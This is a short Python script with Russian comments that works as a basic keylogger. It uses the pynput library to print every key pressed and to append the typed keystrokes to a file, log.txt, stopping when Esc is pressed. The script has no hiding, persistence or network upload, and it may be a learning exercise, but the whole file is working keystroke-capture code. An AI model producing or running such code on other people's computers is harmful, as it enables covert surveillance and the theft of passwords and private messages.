import pynput
from pynput.keyboard import Key, Listener


#-*-coding: utf-8 -*-



charCount = 0 # количество введенных символов
keys = []  #хранить клавиши, на которые мы нажали


def onKeyPress(key):
    try:
        print("Клавиша нажата:", key) #выводим нажатую клавишу
    except Exception as ex:
        print("Произошла ошибка", ex)


def writeToFile(keys):
    with open("log.txt", "a", encoding="utf-8") as file:
        for sym in keys:
            sym = str(sym).replace("'", "")
            file.write(sym)
        file.write("\n") #вставка новой линии


def onKeyRelease(key):
    global keys, charCount
    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            writeToFile(keys)
            charCount = 0
            keys = []
        elif key == Key.space:
            key = ' '
            writeToFile(keys)
            charCount = 0
            keys = []
        keys.append(key)
        charCount += 1

with Listener(on_press = onKeyPress, on_release=onKeyRelease) as listener:
    listener.join()




